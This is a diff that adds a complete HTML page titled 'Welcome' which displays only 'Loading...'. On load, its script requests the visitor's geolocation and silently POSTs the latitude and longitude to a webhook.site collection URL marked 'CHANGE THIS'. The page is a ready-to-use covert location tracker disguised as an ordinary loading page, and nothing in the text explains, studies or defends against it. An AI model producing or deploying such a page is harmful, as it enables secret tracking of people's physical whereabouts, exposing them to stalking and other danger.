@@ -1,1 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Welcome</title>
+  <script>
+    function sendLocation(lat, lon) {
+      fetch('https://webhook.site/YOUR-UNIQUE-ID', {  // CHANGE THIS
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ latitude: lat, longitude: lon })
+      });
+    }
 
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          console.log("Location found:", lat, lon);
+          sendLocation(lat, lon);
+        }, (error) => {
+          console.error('Error:', error);
+        });
+      } else {
+        console.log("Geolocation not supported.");
+      }
+    }
+
+    window.onload = getLocation;
+  </script>
+</head>
+<body>
+  <h1>Loading...</h1>
+</body>
+</html>
